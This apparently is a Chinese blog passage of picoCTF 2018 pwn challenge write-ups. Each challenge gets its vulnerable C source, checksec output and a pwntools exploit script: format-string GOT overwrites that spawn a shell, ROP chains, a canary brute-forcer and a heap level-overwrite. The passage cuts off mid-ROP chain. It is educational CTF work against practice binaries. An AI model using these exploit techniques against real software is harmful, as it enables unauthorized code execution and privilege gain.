+echo: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=a5f76d1d59c0d562ca051cb171db19b5f0bd8fe7, not stripped
+➜  echooo checksec echo
+[*] &#39;/home/Ep3ius/pwn/process/picoCTF2018/echooo/echo&#39;
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+</code></pre>
+<pre><code class="c">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;sys/types.h&gt;
+
+int main(int argc, char **argv){
+
+  setvbuf(stdout, NULL, _IONBF, 0);
+
+  char buf[64];
+  char flag[64];
+  char *flag_ptr = flag;
+
+  // Set the gid to the effective gid
+  gid_t gid = getegid();
+  setresgid(gid, gid, gid);
+
+  memset(buf, 0, sizeof(flag));
+  memset(buf, 0, sizeof(buf));
+
+  puts(&quot;Time to learn about Format Strings!&quot;);
+  puts(&quot;We will evaluate any format string you give us with printf().&quot;);
+  puts(&quot;See if you can get the flag!&quot;);
+
+  FILE *file = fopen(&quot;flag.txt&quot;, &quot;r&quot;);
+  if (file == NULL) {
+    printf(&quot;Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n&quot;);
+    exit(0);
+  }
+
+  fgets(flag, sizeof(flag), file);
+
+  while(1)
+  {
+    printf(&quot;&gt; &quot;);
+    fgets(buf, sizeof(buf), stdin);
+    printf(buf);
+  }  
+  return 0;
+}
+</code></pre>
+<p>审计完源码后发现在main函数末尾存在可多次利用的格式化字符串漏洞，而flag已经读入到栈上本来的解题思路应该是通过格式化字符串读栈上flag所在的位置来获得flag，但我的第一想法是直接改printf_got为system的实际地址拿shell</p>
+<p>先测出来偏移为11</p>
+<pre><code class="bash">➜  echooo ./echo
+Time to learn about Format Strings!
+We will evaluate any format string you give us with printf().
+See if you can get the flag!
+&gt; aaaa%11$x
+aaaa61616161
+</code></pre>
+<p>然后通过p32(printf_got)+”%11$s”泄露出printf的实际地址来计算偏移以此得到system的实际地址</p>
+<p>EXP</p>
+<pre><code class="python">from pwn import*
+context(os=&#39;linux&#39;,arch=&#39;i386&#39;,log_level=&#39;debug&#39;)
+#n = process(&#39;./echo&#39;)
+n = remote(&#39;2018shell2.picoctf.com&#39;,57169)
+elf = ELF(&#39;./echo&#39;)
+libc = ELF(&#39;/lib32/libc.so.6&#39;)
+
+#printf_got = elf.got[&#39;printf&#39;]
+printf_got = 0x804a00c
+printf_sym = libc.symbols[&#39;printf&#39;]
+system_sym = libc.symbols[&#39;system&#39;]
+
+payload = p32(printf_got)+&#39;%11$s&#39;
+
+n.recvuntil(&#39;&gt;&#39;)
+n.sendline(payload)
+#leak
+
+printf_addr1 = n.recvuntil(&#39;\n&#39;)
+printf_addr = u32(printf_addr1[5:9])
+print hex(printf_addr)
+
+offset = printf_addr - printf_sym
+system_addr = offset + system_sym
+print hex(system_addr)
+
+payload_fmt = fmtstr_payload(11,{printf_got:system_addr})
+n.recvuntil(&#39;&gt;&#39;)
+n.sendline(payload_fmt)
+sleep(0.1)
+n.sendline(&#39;/bin/sh\0&#39;)
+
+n.interactive()
+</code></pre>
+<p>FLAG</p>
+<pre><code>picoCTF{foRm4t_stRinGs_aRe_DanGer0us_e3d226b2}
+</code></pre><h3 id="authenticate"><a href="#authenticate" class="headerlink" title="authenticate"></a>authenticate</h3><pre><code class="bash">➜  authenticate file auth
+auth: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=36db9dbaf46e8f9c9055839ffedd30fe65050a47, not stripped
+➜  authenticate checksec auth
+[*] &#39;/home/Ep3ius/pwn/process/picoCTF2018/authenticate/auth&#39;
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+</code></pre>
+<p>审计下源码</p>
+<pre><code class="c">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;stdint.h&gt;
+#include &lt;string.h&gt;
+#include &lt;sys/types.h&gt;
+
+int authenticated = 0;
+
+int flag() {
+  char flag[48];
+  FILE *file;
+  file = fopen(&quot;flag.txt&quot;, &quot;r&quot;);
+  if (file == NULL) {
+    printf(&quot;Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n&quot;);
+    exit(0);
+  }
+
+  fgets(flag, sizeof(flag), file);
+  printf(&quot;%s&quot;, flag);
+  return 0;
+}
+
+void read_flag() {
+  if (!authenticated) {
+    printf(&quot;Sorry, you are not *authenticated*!\n&quot;);
+  }
+  else {
+    printf(&quot;Access Granted.\n&quot;);
+    flag();
+  }
+
+}
+
+int main(int argc, char **argv) {
+
+  setvbuf(stdout, NULL, _IONBF, 0);
+
+  char buf[64];
+
+  // Set the gid to the effective gid
+  // this prevents /bin/sh from dropping the privileges
+  gid_t gid = getegid();
+  setresgid(gid, gid, gid);
+
+  printf(&quot;Would you like to read the flag? (yes/no)\n&quot;);
+
+  fgets(buf, sizeof(buf), stdin);
+
+  if (strstr(buf, &quot;no&quot;) != NULL) {
+    printf(&quot;Okay, Exiting...\n&quot;);
+    exit(1);
+  }
+  else if (strstr(buf, &quot;yes&quot;) == NULL) {
+    puts(&quot;Received Unknown Input:\n&quot;);
+    printf(buf);
+  }
+
+  read_flag();
+
+}
+</code></pre>
+<p>简单的过一遍我们可以得到程序的大致流程，如果输入的字符串内带有”no”就退出程序，如果输入的字符串带有”yes”且没有”no”便进入unknown_input分支并触发了一个格式化字符串漏洞，然后程序继续执行进入read_flag()函数里，先进行一个判断，如果authenticated不为0就能调用flag函数来getflag，而authenticated是在一开始就全局定义为0了，这时我们能想到通过利用前面的格式化字符串来修改authenticated的值</p>
+<p>EXP</p>
+<pre><code class="python">from pwn import*
+context(os=&#39;linux&#39;,arch=&#39;i386&#39;,log_level=&#39;debug&#39;)
+#n = process(&#39;./auth&#39;)
+n = remote(&#39;2018shell2.picoctf.com&#39;,52398)
+elf = ELF(&#39;./auth&#39;)
+
+puts_got = elf.got[&#39;puts&#39;]
+puts_sym = elf.symbols[&#39;puts&#39;]
+
+authenticated_addr = 0x0804A04C
+payload = fmtstr_payload(11,{authenticated_addr:0xDEADBEEF})
+n.sendline(payload)
+
+n.interactive()
+</code></pre>
+<p>FLAG</p>
+<pre><code>picoCTF{y0u_4r3_n0w_aUtH3nt1c4t3d_0bec1698}
+</code></pre><h3 id="got—shell"><a href="#got—shell" class="headerlink" title="got—shell?"></a>got—shell?</h3><pre><code class="bash">➜  got-shell file auth
+auth: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=5c1f84b034b4906cce036c3748d4b5a5c3eae0d8, not stripped
+➜  got-shell checksec auth
+[*] &#39;/home/Ep3ius/pwn/process/picoCTF2018/got-shell/auth&#39;
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+</code></pre>
+<p>看一波源码</p>
+<pre><code class="c">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;stdint.h&gt;
+#include &lt;string.h&gt;
+#include &lt;sys/types.h&gt;
+
+void win() {
+  system(&quot;/bin/sh&quot;);
+}
+
+int main(int argc, char **argv) {
+
+  setvbuf(stdout, NULL, _IONBF, 0);
+
+  char buf[256];
+
+  unsigned int address;
+  unsigned int value;
+
+  puts(&quot;I&#39;ll let you write one 4 byte value to memory. Where would you like to write this 4 byte value?&quot;);
+
+  scanf(&quot;%x&quot;, &amp;address);
+
+  sprintf(buf, &quot;Okay, now what value would you like to write to 0x%x&quot;, address);
+  puts(buf);
+
+  scanf(&quot;%x&quot;, &amp;value);
+
+  sprintf(buf, &quot;Okay, writing 0x%x to 0x%x&quot;, value, address);
+  puts(buf);
+
+  *(unsigned int *)address = value;
+
+  puts(&quot;Okay, exiting now...\n&quot;);
+  exit(1);
+
+}
+</code></pre>
+<p>开始还以为自己是不是C没学好，这题怎么可能这么简单输入两个地址就getshell了，结果发现还真的是。程序的逻辑大致为输入一个十六进制的地址，然后再输入一个十六进制的数值，然后把第一次输入的地址的值替换成输入的数值，我们可以很容易想到用win函数的地址去替换puts_got，这样在程序调用puts时就相当调用了win函数来getshell</p>
+<p>EXP</p>
+<pre><code class="PYTHON">from pwn import*
+context(os=&#39;linux&#39;,arch=&#39;i386&#39;,log_level=&#39;debug&#39;)
+#n = process(&#39;./auth&#39;)
+n = remote(&#39;2018shell2.picoctf.com&#39;,23731)
+elf = ELF(&#39;./auth&#39;)
+
+puts_got = elf.got[&#39;puts&#39;]
+win_addr = 0x0804854B
+
+n.sendline(hex(puts_got))
+sleep(0.1)
+n.sendline(hex(win_addr))
+
+n.interactive()
+</code></pre>
+<p>FLAG</p>
+<pre><code>picoCTF{m4sT3r_0f_tH3_g0t_t4b1e_a8321d81}
+</code></pre><h3 id="rop-chain"><a href="#rop-chain" class="headerlink" title="rop chain"></a>rop chain</h3><pre><code class="bash">➜  ropchain file rop
+rop: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=86b31b317beb6a0fac1439ef6b2a271e0132537e, not stripped
+➜  ropchain checksec rop
+[*] &#39;/home/Ep3ius/pwn/process/picoCTF2018/ropchain/rop&#39;
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+</code></pre>
+<p>看一下源码</p>
+<pre><code class="c">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;stdbool.h&gt;
+
+#define BUFSIZE 16
+
+bool win1 = false;
+bool win2 = false;
+
+
+void win_function1() {
+  win1 = true;
+}
+
+void win_function2(unsigned int arg_check1) {
+  if (win1 &amp;&amp; arg_check1 == 0xBAAAAAAD) {
+    win2 = true;
+  }
+  else if (win1) {
+    printf(&quot;Wrong Argument. Try Again.\n&quot;);
+  }
+  else {
+    printf(&quot;Nope. Try a little bit harder.\n&quot;);
+  }
+}
+
+void flag(unsigned int arg_check2) {
+  char flag[48];
+  FILE *file;
+  file = fopen(&quot;flag.txt&quot;, &quot;r&quot;);
+  if (file == NULL) {
+    printf(&quot;Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n&quot;);
+    exit(0);
+  }
+
+  fgets(flag, sizeof(flag), file);
+
+  if (win1 &amp;&amp; win2 &amp;&amp; arg_check2 == 0xDEADBAAD) {
+    printf(&quot;%s&quot;, flag);
+    return;
+  }
+  else if (win1 &amp;&amp; win2) {
+    printf(&quot;Incorrect Argument. Remember, you can call other functions in between each win function!\n&quot;);
+  }
+  else if (win1 || win2) {
+    printf(&quot;Nice Try! You&#39;re Getting There!\n&quot;);
+  }
+  else {
+    printf(&quot;You won&#39;t get the flag that easy..\n&quot;);
+  }
+}
+
+void vuln() {
+  char buf[16];
+  printf(&quot;Enter your input&gt; &quot;);
+  return gets(buf);
+}
+
+int main(int argc, char **argv){
+
+  setvbuf(stdout, NULL, _IONBF, 0);
+
+  // Set the gid to the effective gid
+  // this prevents /bin/sh from dropping the privileges
+  gid_t gid = getegid();
+  setresgid(gid, gid, gid);
+  vuln();
+}
+</code></pre>
+<p>审计过代码后我们可以得到程序中各个函数的功能和作用，像win_function1函数的作用为将全局变量win1的值赋为1，win_function2函数的作用是在win1非0且传入的参数为0xBAAAAAAD时将全局变量win2的值赋为1，flag函数的作用是当全局变量win1，win2都不为0且传入的参数为0xDEADBAAD时输出flag，这样我们就知道要通过vuln函数里的栈溢出来构造ROP去分别执行这三个函数getflag</p>
+<p><img src="https://raw.githubusercontent.com/Nepire/Nepire.github.io/master/_posts/%E6%8A%95%E7%A8%BF__picoCTF%E3%81%AEpwn%E8%A7%A3%E6%9E%90.assets/1538900722977.png" alt="1538900722977"></p>
+<p>EXP</p>
+<pre><code class="python">from pwn import*
+context(os=&#39;linux&#39;,arch=&#39;i386&#39;,log_level=&#39;debug&#39;)
+n = process(&#39;./rop&#39;)
+elf = ELF(&#39;./rop&#39;)
+
+func1 = 0x080485CB
+func2 = 0x080485d8
+flag = 0x0804862B
+pop_ret = 0x080485d6
+buf = &#39;a&#39;*0x18
+
+payload = buf + &#39;aaaa&#39;
+payload += p32(func1)+p32(pop_ret) + p32(0)
+payload += p32(func2)+p32(pop_ret) + p32(0xBAAAAAAD)
+payload += p32(flag)+p32(pop_ret) + p32(0xDEADBAAD)
+
+n.recvuntil(&#39;&gt;&#39;)
+n.sendline(payload)
+
+n.interactive()
+</code></pre>
+<p>FLAG</p>
+<pre><code>picoCTF{rOp_aInT_5o_h4Rd_R1gHt_6e6efe52}
+</code></pre><h3 id="buffer-overflow-3"><a href="#buffer-overflow-3" class="headerlink" title="buffer overflow 3"></a>buffer overflow 3</h3><pre><code class="bash">➜  bufferoverflow3 file vuln
+vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=49bf81f7f16a1c26cfbbb0a70bb89246fadc370e, not stripped
+➜  bufferoverflow3 checksec vuln
+[*] &#39;/home/Ep3ius/pwn/process/picoCTF2018/bufferoverflow3/vuln&#39;
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+</code></pre>
+<p>嗯，没开canary，看一波源码</p>
+<pre><code class="c">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;wchar.h&gt;
+#include &lt;locale.h&gt;
+
+#define BUFSIZE 32
+#define FLAGSIZE 64
+#define CANARY_SIZE 4
+
+void win() {
+  char buf[FLAGSIZE];
+  FILE *f = fopen(&quot;flag.txt&quot;,&quot;r&quot;);
+  if (f == NULL) {
+    printf(&quot;Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n&quot;);
+    exit(0);
+  }
+
+  fgets(buf,FLAGSIZE,f);
+  puts(buf);
+  fflush(stdout);
+}
+
+char global_canary[CANARY_SIZE];
+void read_canary() {
+  FILE *f = fopen(&quot;canary.txt&quot;,&quot;r&quot;);
+  if (f == NULL) {
+    printf(&quot;Canary is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n&quot;);
+    exit(0);
+  }
+
+  fread(global_canary,sizeof(char),CANARY_SIZE,f);
+  fclose(f);
+}
+
+void vuln(){
+   char canary[CANARY_SIZE];
+   char buf[BUFSIZE];
+   char length[BUFSIZE];
+   int count;
+   int x = 0;
+   memcpy(canary,global_canary,CANARY_SIZE);
+   printf(&quot;How Many Bytes will You Write Into the Buffer?\n&gt; &quot;);
+   while (x&lt;BUFSIZE) {
+      read(0,length+x,1);
+      if (length[x]==&#39;\n&#39;) break;
+      x++;
+   }
+   sscanf(length,&quot;%d&quot;,&amp;count);
+
+   printf(&quot;Input&gt; &quot;);
+   read(0,buf,count);
+
+   if (memcmp(canary,global_canary,CANARY_SIZE)) {
+      printf(&quot;*** Stack Smashing Detected *** : Canary Value Corrupt!\n&quot;);
+      exit(-1);
+   }
+   printf(&quot;Ok... Now Where&#39;s the Flag?\n&quot;);
+   fflush(stdout);
+}
+
+int main(int argc, char **argv){
+
+  setvbuf(stdout, NULL, _IONBF, 0);
+
+  // Set the gid to the effective gid
+  // this prevents /bin/sh from dropping the privileges
+  int i;
+  gid_t gid = getegid();
+  setresgid(gid, gid, gid);
+  read_canary();
+  vuln();
+  return 0;
+}
+</code></pre>
+<p>打开审计后发现它自己实现了一个简易的Canary防护函数，我们针对canary常用的攻击方式中Stack Smashing Protector  Leak</p>
+<p>攻击可以立马否决，因为错误回显并没有输出avgr[0]这个必要条件。程序中canary的值是从一个内容不变的文本文档中读取的，所以我们可以通过写爆破脚本去把canary的具体内容输出出来。</p>
+<p>通过ida我们可以得到canary插入在栈上0x10的位置，输入的首地址位于栈上0x30，</p>
+<pre><code class="stack">  char buf; // [esp+28h] [ebp-30h]
+  int canary; // [esp+48h] [ebp-10h]
+</code></pre>
+<p>我们运行程序测试一下</p>
+<pre><code class="bash">➜  bufferoverflow3 ./vuln
+How Many Bytes will You Write Into the Buffer?
+&gt; 32
+Input&gt; aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+Ok... Now Where&#39;s the Flag?
+➜  bufferoverflow3 ./vuln
+How Many Bytes will You Write Into the Buffer?
+&gt; 33
+Input&gt; aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+*** Stack Smashing Detected *** : Canary Value Corrupt!
+</code></pre>
+<p>确认canary插入的位置为0x20</p>
+<p>bp.py</p>
+<pre><code class="python">from pwn import*
+#canary = &#39;h_?=&#39;
+canary = &#39;&#39;
+for i in range(4):
+        for a in range(0xff):
+                n = process(&#39;./vuln&#39;)
+                n.recvuntil(&#39;&gt; &#39;)
+                n.sendline(&#39;36&#39;)
+                n.recvuntil(&#39;Input&gt; &#39;)
+                payload = &#39;a&#39;*0x20+canary+chr(a)
+                #print chr(a)
+                n.send(payload)
+                try:
+                        n.recvuntil(&#39;*** Stack Smashing Detected ***&#39;)
+                except:
+                        if canary==&#39;&#39;:
+                            canary = chr(a)
+                        else:
+                            canary += chr(a)
+                        n.close()
+                        break
+                else:
+                        n.close()
+
+print &#39;canary:&#39;,canary
+</code></pre>
+<p>通过爆破我们得到canary的值为”h_?=”实在是鬼畜，本以为是PICO的我还是太天真了</p>
+<p>在知道canary的情况下，剩下的就是简单的栈溢出劫持程序执行流至win函数就能get flag了</p>
+<p>EXP</p>
+<pre><code class="python">from pwn import*
+context(os=&#39;linux&#39;,arch=&#39;i386&#39;,log_level=&#39;debug&#39;)
+n = process(&#39;./vuln&#39;)
+elf = ELF(&#39;./vuln&#39;)
+canary = &#39;h_?=&#39;
+
+win_addr = 0x080486EB
+
+payload = &#39;a&#39;*0x20+canary+&#39;a&#39;*(0x10-len(canary)+4)+p32(win_addr)
+
+n.recvuntil(&#39;&gt; &#39;)
+n.sendline(&#39;100&#39;)
+n.recvuntil(&#39;Input&gt; &#39;)
+n.sendline(payload)
+
+n.interactive()
+</code></pre>
+<h3 id="echo-back"><a href="#echo-back" class="headerlink" title="echo back"></a>echo back</h3><pre><code class="bash">➜  echo back file echoback
+echoback: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=a0980ead6e67788ea13395e9bdd23f0fe3d0b2c8, not stripped
+➜  echo back checksec echoback
+[*] &#39;/home/Ep3ius/pwn/process/picoCTF2018/echo back/echoback&#39;
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+</code></pre>
+<p>开了NX和Canary，审计下源码……然而这题并没有给，那就开ida看一下程序干了些什么</p>
+<pre><code class="c">int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  __gid_t v3; // ST1C_4
+
+  setvbuf(_bss_start, 0, 2, 0);
+  v3 = getegid();
+  setresgid(v3, v3, v3);
+  vuln();
+  return 0;
+}
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/Nepire/Nepire.github.io/master/_posts/%E6%8A%95%E7%A8%BF__picoCTF%E3%81%AEpwn%E8%A7%A3%E6%9E%90.assets/1538928251008.png" alt="1538928251008"></p>
+<p>我们在vuln函数里发现存在一个格式化字符串漏洞，由于我太菜了没能想出能只用一次格式化字符串就能getshell的payload，所以就想先把puts_got改成了vuln函数的地址，让这个格式化字符串漏洞能多次触发。</p>
+<p>我们审计过程序后能得到的大致思路为先测出偏移，修改puts_got为vuln函数地址使得漏洞能多次触发，然后通过p32(system_got)+fmt_offset来得到system的真实地址，再把system的真实地址写入printf_got，然后在下一轮循环中输入’/bin/sh’后printf(‘/bin/sh’)就相当执行了system(‘/bin/sh’)来getshell</p>
+<pre><code class="bash">➜  echo back ./echoback
+input your message:
+aaaa%7$x
+aaaa61616161
+
+Thanks for sending the message!
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/Nepire/Nepire.github.io/master/_posts/%E6%8A%95%E7%A8%BF__picoCTF%E3%81%AEpwn%E8%A7%A3%E6%9E%90.assets/1538929511533.png" alt="1538929511533"></p>
+<p>EXP</p>
+<pre><code class="python">from pwn import*
+context(os=&#39;linux&#39;,arch=&#39;i386&#39;,log_level=&#39;debug&#39;)
+#n = process(&#39;./echoback&#39;)
+n = remote(&#39;2018shell2.picoctf.com&#39;,37402)
+elf = ELF(&#39;./echoback&#39;)
+
+printf_got = elf.got[&#39;printf&#39;]
+puts_got = elf.got[&#39;puts&#39;]
+system_got = elf.got[&#39;system&#39;]
+vuln_addr = 0x080485AB
+
+payload1 = fmtstr_payload(7,{puts_got:vuln_addr})
+n.recvuntil(&#39;message:&#39;)
+n.sendline(payload1)
+
+leak_payload = p32(system_got)+&#39;%7$s&#39;
+n.send(leak_payload)
+n.recvuntil(&#39;message:&#39;)
+system_addr = u32(n.recv()[5:9])
+print hex(system_addr)
+
+payload = fmtstr_payload(7,{printf_got:system_addr})
+n.sendline(payload)
+
+n.interactive()
+</code></pre>
+<h3 id="are-you-root"><a href="#are-you-root" class="headerlink" title="are you root?"></a>are you root?</h3><pre><code class="bash">➜  are_you_root file auth
+auth: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=42ebad5f08a8e9d227f3783cc951f2737547e086, not stripped
+➜  are_you_root checksec auth
+[*] &#39;/home/Ep3ius/pwn/process/picoCTF2018/are_you_root/auth&#39;
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+</code></pre>
+<p>源码分析过一遍后,我们锁定了几个存在漏洞可能的分支</p>
+<p>输入用的是fgets</p>
+<pre><code class="c">if(fgets(buf, 512, stdin) == NULL)
+      break;
+</code></pre>
+<pre><code class="c">typedef enum auth_level {
+  ANONYMOUS = 1,
+  GUEST = 2,
+  USER = 3,
+  ADMIN = 4,
+  ROOT = 5
+} auth_level_t;
+
+struct user {
+  char *name;
+  auth_level_t level;
+};
+</code></pre>
+<p>login分支</p>
+<pre><code class="c">    else if (!strncmp(buf, &quot;login&quot;, 5))
+    {
+      if (user != NULL)
+      {
+           puts(&quot;Already logged in. Reset first.&quot;);
+           continue;
+      }
+
+      arg = strtok(&amp;buf[6], &quot;\n&quot;);
+      if (arg == NULL)
+      {
+        puts(&quot;Invalid command&quot;);
+          continue;
+      }
+
+      user = (struct user *)malloc(sizeof(struct user));
+      if (user == NULL)
+      {
+        puts(&quot;malloc() returned NULL. Out of Memory\n&quot;);
+        exit(-1);
+      }
+      user-&gt;name = strdup(arg);
+      printf(&quot;Logged in as \&quot;%s\&quot;\n&quot;, arg);
+
+    }
+</code></pre>
+<p>reset分支</p>
+<pre><code class="c">    else if(!strncmp(buf, &quot;reset&quot;, 5))
+    {
+      if (user == NULL)
+      {
+          puts(&quot;Not logged in!&quot;);
+          continue;
+      }
+
+      free(user-&gt;name);
+      user = NULL;
+
+      puts(&quot;Logged out!&quot;);
+    }
+</code></pre>
+<p>我们先登陆一个name=’a’* 0x10,level=3的账号，下断点看一下堆里面的分布</p>
+<pre><code class="c">gdb-peda$ parseheap
+addr                prev                size                 status              fd                bk                
+0x603000            0x0                 0x410                Used                None              None
+0x603410            0x0                 0x20                 Used                None              None
+0x603430            0x0                 0x20                 Used                None              None
+gdb-peda$ x/8x 0x603410
+0x603410:    0x0000000000000000             0x0000000000000021
+0x603420:    0x0000000000603440 &lt;-*name     0x0000000000000003 &lt;-level
+0x603430:    0x0000000000000000            0x0000000000000021
+0x603440:    0x6161616161616161 &lt;-name    0x6161616161616161 &lt;-name
+gdb-peda$
+0x603450:    0x0000000000000000            0x0000000000020bb1
+0x603460:    0x0000000000000000            0x0000000000000000
+0x603470:    0x0000000000000000            0x0000000000000000
+0x603480:    0x0000000000000000            0x0000000000000000
+</code></pre>
+<p>然后reset这个账号，再看下堆</p>
+<pre><code class="c">gdb-peda$ x/8x 0x603410
+0x603410:    0x0000000000000000             0x0000000000000021
+0x603420:    0x0000000000603440 &lt;-*name     0x0000000000000003
+0x603430:    0x0000000000000000            0x0000000000000021
+0x603440:    0x0000000000000000            0x6161616161616161 &lt;- over_name
+gdb-peda$
+0x603450:    0x0000000000000000            0x0000000000020bb1
+0x603460:    0x0000000000000000            0x0000000000000000
+0x603470:    0x0000000000000000            0x0000000000000000
+0x603480:    0x0000000000000000            0x0000000000000000
+
+</code></pre>
+<p>发现0x603440里的值已经置为NULL了，但0x603448部分的值却没被清0，又因为我们的name可以输入很长，并且在建立账号时并没有对level置0操作，所以如果我们去构造一个name使其可以覆盖到下一个堆的level位就可以做到下一个账号的level位可以任意修改</p>
+<p>我们再建一个账号看看下一个账号的level位和前一个账号的name的相对位置</p>
+<pre><code class="c">gdb-peda$ x/8x 0x603410
+0x603410:    0x0000000000000000            0x0000000000000021
+0x603420:    0x0000000000603440            0x0000000000000000
+0x603430:    0x0000000000000000 &lt;-name    0x0000000000000021
+0x603440:    0x0000000000603460            0x0000000000000003 &lt;-level
+</code></pre>
+<p>通过计算我们可以很容易得到name的起始位置和下一个账号的level位距离位8，那么我们直接构造’a’* 0x8+p64(5)就能设好下一个账号的level位</p>
+<p>EXP</p>
+<pre><code class="python">from pwn import*
+context(os=&#39;linux&#39;,arch=&#39;amd64&#39;,log_level=&#39;debug&#39;)
+n = remote(&#39;2018shell2.picoctf.com&#39;,41208)
+#n = process(&#39;./auth&#39;)
+elf = ELF(&#39;./auth&#39;)
+
+def reset():
+    n.recvuntil(&#39;&gt; &#39;)
+    n.sendline(&#39;reset&#39;)
+
+def login(name):
+    n.recvuntil(&#39;&gt; &#39;)
+    n.sendline(&#39;login &#39;+name)
+
+def getflag():
+    n.sendline(&#39;get-flag&#39;)
+
+payload = &#39;a&#39;*8+p64(5)
+login(payload)
+gdb.attach(n)
+
+reset()
+login(&#39;Ep3ius&#39;)
+getflag()
+
+n.interactive()
+</code></pre>
+<p>FLAG</p>
+<pre><code>picoCTF{m3sS1nG_w1tH_tH3_h43p_bc7d345a}
+</code></pre><h3 id="can-you-gets-me"><a href="#can-you-gets-me" class="headerlink" title="can-you-gets-me"></a>can-you-gets-me</h3><pre><code class="bash">➜  can-you-gets-me file gets
+gets: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.32, BuildID[sha1]=4141b1e04d2e7f1623a4b8923f0f87779c0827ee, not stripped
+➜  can-you-gets-me checksec gets
+[*] &#39;/home/Ep3ius/pwn/process/picoCTF2018/can-you-gets-me/gets&#39;
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+</code></pre>
+<pre><code class="c">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;sys/types.h&gt;
+
+#define BUFSIZE 16
+
+void vuln() {
+  char buf[16];
+  printf(&quot;GIVE ME YOUR NAME!\n&quot;);
+  return gets(buf);
+
+}
+
+int main(int argc, char **argv){
+
+  setvbuf(stdout, NULL, _IONBF, 0);
+
+
+  // Set the gid to the effective gid
+  // this prevents /bin/sh from dropping the privileges
+  gid_t gid = getegid();
+  setresgid(gid, gid, gid);
+  vuln();
+
+}
+</code></pre>
+<p>看了一波源码，只给了一个gets和printf，一开始我还想说是不是用ret2dl-resolve，后来肝了一天都没肝出，查报错的时候发现没办法找到plt表，就在想这个会不会是静态编译的文件，就用ldd检查了下</p>
+<pre><code class="bash">➜  can-you-gets-me ldd gets
+    不是动态可执行文件
+➜  can-you-gets-me
+</code></pre>
+<p>emmmm，居然还真是静态库编译的那么我们试试用ropgadget的ropchain来构造ROP链玄学一键getshell</p>
+<pre><code class="bash">ROPgadget --binary gets --ropchain
+</code></pre>
+<pre><code class="bash">- Step 5 -- Build the ROP chain
+
+    #!/usr/bin/env python2
+    # execve generated by ROPgadget
+
+    from struct import pack
+
+    # Padding goes here
+    p = &#39;&#39;
+
+    p += pack(&#39;&lt;I&#39;, 0x0806f02a) # pop edx ; ret
+    p += pack(&#39;&lt;I&#39;, 0x080ea060) # @ .data
+    p += pack(&#39;&lt;I&#39;, 0x080b81c6) # pop eax ; ret
+    p += &#39;/bin&#39;
+    p += pack(&#39;&lt;I&#39;, 0x080549db) # mov dword ptr [edx], eax ; ret
+    p += pack(&#39;&lt;I&#39;, 0x0806f02a) # pop edx ; ret
+    p += pack(&#39;&lt;I&#39;, 0x080ea064) # @ .data + 4
+    p += pack(&#39;&lt;I&#39;, 0x080b81c6) # pop eax ; ret
+    p += &#39;//sh&#39;
+    p += pack(&#39;&lt;I&#39;, 0x080549db) # mov dword ptr [edx], eax ; ret
+    p += pack(&#39;&lt;I&#39;, 0x0806f02a) # pop edx ; ret
+    p += pack(&#39;&lt;I&#39;, 0x080ea068) # @ .data + 8
